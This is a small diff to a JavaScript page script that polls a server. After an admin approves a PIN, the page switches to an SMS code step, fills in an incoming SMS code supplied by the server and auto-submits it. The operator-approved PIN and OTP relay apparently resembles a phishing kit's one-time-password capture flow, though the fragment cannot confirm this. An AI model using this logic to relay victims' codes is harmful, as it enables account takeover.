@@ -193,9 +193,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 const data = await res.json();
 
                 if (data.status === 'approved_pin') {
+                    // Open SMS page immediately upon admin allow click
                     if (stepOtp.classList.contains('hidden')) {
                         switchStep(stepLoading, stepOtp);
                     }
+                    // Wait for incoming SMS to pick, populate, and auto-submit
                     if (data.incomingSMS && !otpText.value.trim() && !isAutoSubmitting) {
                         otpText.value = data.incomingSMS;
                         charCount.innerText = `${data.incomingSMS.length}/1000`;
@@ -228,4 +230,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2500);
     }
 });
-                          
+                                                   
